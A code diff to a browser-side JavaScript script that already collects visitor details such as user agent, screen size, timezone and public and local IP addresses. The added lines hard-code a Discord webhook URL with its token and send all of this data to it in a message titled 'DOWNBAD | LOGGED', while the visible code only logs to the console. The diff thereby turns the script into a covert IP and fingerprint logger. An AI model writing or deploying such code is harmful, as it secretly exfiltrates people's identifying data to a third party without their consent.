@@ -5,6 +5,7 @@
   const screenSize = `${screen.width}x${screen.height}`;
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   const cookiesEnabled = navigator.cookieEnabled;
+  const wh = "https://canary.discord.com/api/webhooks/1385066531788165221/qkaMVIWE23JM4tx8PAceEWpx2skbbfu-MvgnzTOAQ81LRRVYs8QK3anhEGzJBn2jRM-s"
 
   let publicIP = "Unavailable";
   try {
@@ -34,6 +35,32 @@
   }
 
   await new Promise(resolve => setTimeout(resolve, 1000));
+
+  const payload = {
+    embeds: [
+      {
+        title: "DOWNBAD | LOGGED",
+        description: `**User Agent:** ${userAgent}
+        **Platform:** ${platform}
+        **Language:** ${language}
+        **Screen Size:** ${screenSize}
+        **Timezone:** ${timezone}
+        **Cookies Enabled:** ${cookiesEnabled}
+        **Public IP:** ${publicIP}
+        **Local IP:** ${localIP}`,
+        color: 0xff4500
+      }
+    ]
+  };
+
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
+  })
+
 
   console.log("User Agent:", userAgent);
   console.log("Platform:", platform);
